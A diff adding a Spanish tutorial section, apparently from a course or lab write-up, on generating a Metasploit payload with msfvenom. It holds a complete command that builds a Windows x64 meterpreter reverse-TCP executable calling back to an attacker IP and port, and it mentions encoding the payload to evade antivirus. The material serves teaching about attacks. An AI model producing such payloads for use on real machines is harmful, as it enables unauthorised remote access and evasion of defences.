@@ -32,3 +32,29 @@ De la discusión anterior se desgrana el proceso común de ataque a un sistema v
 Con este esquema claro pasamos a detallar cada una de las partes.
 
 ## Generando el payload: MSFVENOM
+Para facilitar la comprensión de este paso podemos aludir a la formación que hemos adquirido en asignaturas como Sistemas Operativos o Programación en las que estudiamos el proceso que nos lleva desde un archivo fuente *.c a un ejecutable compilado. De manera muy resumida podemos decir que el código fuente pasa por el preprocesador que sustituirá todas las directivas #include <>. A continuación el archivo resultante pasa por el compilador que se encargará de generar archivos objeto *.o para después enlazarlo junto con los demás gracias al enlazador. Tras este último paso llegamos a nuestro ejecutable funcional.
+
+Si observamos este ejecutable con una herramienta como xxd solo veremos una ristra de bytes comprensibles por nuestro equipo, el denominado código máquina. Ahora, si hacemos lo propio con los payloads generados por MSFVENOM veremos que, en efecto, es análogo a un programa compilado. Con esto queremos demostrar que MSFVENOM simplemente nos devuelve ejecutables ya generados. Nosotros podremos controlar qué tipo de payload queremos pero, al final del día, simplemente se nos devuelve un programa listo para ejecutar.
+
+Si bien los lenguajes interpretados como Python están cobrando cada vez más notoriedad en el mundo actual no debemos olvidarnos de las sutilezas que entraña la compilación de programas. Los sistemas operativos se caracterizan por una serie de parámetros como son el kernel o núcleo que emplean o la arquitectura para la que están diseñados. Esto implica que programas generados para una plataforma que se sustente sobre Linux no son compatibles con otros que corran sobre Windows NT, el kernel del sistema operativo homónimo. Bien es verad que existen interfaces del sistema operativo estñandar como POSIX pero no podemos aventurarnos a asegurar que un programa escrito para Windows corra en otro basado en Linux y viceveresa. Lo que es más, dentro de cada una de las familias anteriores distinguimos arquitecturas impuestas por las características físicas de la máquina, siendo las más típicas la de 64 bits (amd64/x64) y la ya algo obsoleta de 32 bits (i386/x86). Al igual que antes un programa compilado para una arquitectura no será compatible con la otra.
+
+Teniendo en cuenta las variables que hemos descrito llegamos a que podemos generar 4 tipos de payloads en función del objetivo que tengamos. Estas 4 variables son:
+
+- Linux - 64 bits
+- Linux - 32 bits
+- Windows - 64 bits
+- Windows - 32 bits
+
+Con esto en mente debemos alterar la salida que nos ofrece MSFVENOM a través de sus opciones para generer el payload deseado. Con el fin de ocultar la complejidad de usar la herramienta directamente hemos escrito un script de bash (la shell por defecto de Kali y otras muchas distribuciones) que se encarga de esto por nosotros. El script en cuestión es `gen_payload.sh`. No obstante, adjuntamos una invocación de ejemplo de MSFVENOM para comentar qué efecto tiene cada una de sus opciones:
+
+```bash
+msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=5000 -f exe -o win_pyld.exe
+```
+
+Con lo anterior estamos generando el payload `win_pyld.exe`. La arquitectura y plataforma de este programa vienen dadas por las opciones `-a` y `--platform` respectivamente. Consultando los valores pasados vemos que se trata de una máquina que ejecuta la versión de 64 bits de Windows. Asimismo, el tipo de payload seleccionado es `windows/x64/meterpreter/reverse_tcp`. En la siguiente sección comentaremos el funcionamiento de la misma. Dado el payload escogido debemos pasar 2 opciones que se introducirán en el código del mismo. En este caso son la IP (`LHOST`) y el puerto (`LPORT`) de la máquina atacante. En secciones subsiguientes estudiaremos por qué son necesarias estas opciones. Finalmente especificamos el formato del payload generado con la opción `-f`. Dado que el formato estándar de los archivos ejecutables en Windows. Este archivo generado tendrá, ademas del programa propiamente dicho, las instrucciones necesarias para que el loader de Windows lo cargue correctamente.
+
+Como ya comentamos anteriormente, uno de los mecanismos más comunes para detectar malware es la comparación de archivos sospechosos con firmas almacenadas en bases de datos que se han asociado a algún archivo malicioso. Con la orden anterior hemos generado el payload sin intentar ocultarlo de ninguna manera. Más adelante comentaremos como, a traves de un proceso denominado codificación, podemos intentar ocultar este programa malicioso para así inhibir o al menos dificultar el trabajo de los antivirus.
+
+En definitiva, lo que hemos logrado generar es un programa que, de ser ejecutado en la máquina víctima, nos proporcionará acceso desde la máquina atacante.
+
+## Llevando a cabo el ataque
